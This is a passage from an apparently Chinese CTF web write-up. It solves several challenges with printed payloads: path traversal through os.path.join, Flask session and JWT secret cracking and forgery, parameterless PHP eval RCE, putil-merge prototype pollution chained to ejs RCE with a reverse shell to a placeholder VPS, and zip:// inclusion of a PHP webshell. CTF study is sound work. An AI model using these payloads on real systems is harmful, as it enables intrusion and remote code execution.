class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>利用绝对路径拼接漏洞：</p><blockquote><p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。<br>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径。</p></blockquote><p><code>os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39;</code></p><p>故在 <code>/upload</code> 路由，POST <code>title=/f14444&amp;content=qwe</code>，即可拿到flag。</p><p>​    </p><h3 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h3><blockquote><p>在驾校你不高低得当个教练？</p></blockquote><p>扫描出 <code>robots.txt</code>，泄露信息：<code>3ysd8.html</code>，源码里有注释：</p><p><code>&lt;!-- key是  app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,我可爱的菀宝,我存的够安全的吧) --&gt;</code></p><p>制作爆破secret_key的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">b&#x27;wanbao&#x27;</span>+base64.b64encode(<span class="built_in">str</span>(i).encode())+<span class="string">b&#x27;wanbao&#x27;</span></span><br><span class="line">    g.write(key)</span><br><span class="line">    g.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>爆破flask session的secret_key：</p><p><code>flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt</code></p><p>得到secret_key后，伪造admin的flask session：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39;</code></p><p>进入学员管理页面，找到flag：</p><p><code>既然你是教练，那这个flag学员就交给你吧 SYC&#123;naCcuTYu2mu0c33Fen&#125;</code></p><p>​    </p><h3 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h3><blockquote><p>这是什么？执行一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//当前目录下有好康的😋</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK ME😅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>无参数RCE：<code>?var=print_r(scandir(current(localeconv())));</code></p><p>得到：</p><p><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt )</code></p><p>访问 <code>fl@g.php</code> 得flag。</p><p>​    </p><h3 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h3><blockquote><p>VanZY给白月光写了一张明信片，快去帮他把id签上吧</p></blockquote><p>访问 <code>/source</code> 没权限，提示 <code>&lt;!--Maybe you can view /hint--&gt;</code>。</p><p>访问 <code>/hint</code>，提示 <code>I heard that the challenge maker likes to use his own id as secret_key</code>。</p><p>使用<a href="https://jwt.io/">jwt.io</a>解析jwt，设置secret_key=VanZY，得到 <code>/source</code> 源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;你在做什么？快停下！！！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure><p>在 <code>/code</code> 路由中使用了 <code>putil_merge()</code> ，结合putil-merge原型链污染漏洞（CVE-2021-23470），将 <code>Super</code> 污染，使得 <code>/create</code> 路由内的 <code>Super[&#39;userrole&#39;] === &#39;Superadmin&#39;</code> 成立：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /code</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>进入  <code>/create</code> 路由内，打ejs RCE（CVE-2022-29078），参考：<a href="https://inhann.top/2023/03/26/ejs/">ejs RCE CVE-2022-29078 bypass</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /create HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;xxx&quot;,</span><br><span class="line">  &quot;settings&quot;:&#123;</span><br><span class="line">    &quot;view options&quot;:&#123;</span><br><span class="line">      &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\&quot;\&quot;);&quot;,</span><br><span class="line">      &quot;client&quot;:&quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell，在VPS getshell，<code>cat /Yupr0m1sing_f1ll4agggXD</code> 得到flag：<code>SYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;</code>。</p><p>​    </p><h3 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h3><blockquote><p>”雌小鬼看了下o2takuXX师傅的马子说:”呐~就..就怎么长吗，真是杂鱼呢~❤”,你能来帮帮他吗？</p></blockquote><p>根据源码注释，存在 <code>include.php</code> 文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXX师傅说有问题，忘看了。</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合首页文件上传和压缩的提示，考察zip文件包含。</p><p>首先新建一个zip文件，里面压缩着一个代码为 <code>&lt;?php system($_GET[x]);</code> 的PHP脚本；然后构造 <code>zip://php.zip#php.jpg</code>：</p><p><code>/include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag</code></p><p>即可得到flag。</p><p>​    </p><h3 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h3><blockquote><p>快来找flag！（文件上传的目录为 “/upload”）</p></blockquote><p>查看源代码得到用户名密码 <code>user/user</code>，其中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 一直连不上？连不上就对啦！ --&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">   php版本为8.0</span><br><span class="line"> function php_mt_seed($seed)</span><br><span class="line">       &#123;</span><br><span class="line">           mt_srand($seed);</span><br><span class="line">       &#125;</span><br><span class="line">       $seed = time();</span><br><span class="line">       php_mt_seed($seed);</span><br><span class="line">       $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">       $newFileName = &#x27;&#x27;;</span><br><span class="line">       for ($i = 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">           $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>jwt伪造，爆破c-jwt-cracker：</p><p><code>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4</code></p><p>得到 <code>Secret is &quot;yibao&quot;</code></p><p>构造 <code>&#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125;</code> 对应的JWT：</p><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</code></p><p>根据前面 change.html 源码泄露的 <code>php_mt_seed()</code> 函数知文件名通过随机数更改，抓包，改文件名为1.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change.php HTTP/1.1</span><br><span class="line">------WebKitFormBoundaryLjuFMGS9hc3RMksx</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>上传，同时爆破文件名：<code>https://3v4l.org/UvLQQ#v8.0.30</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=-<span class="number">20</span>;<span class="variable">$k</span>&lt;<span class="number">20</span>;<span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$x</span>+<span class="variable">$k</span>;</span><br><span class="line">    <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的文件名，爆破其存在性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 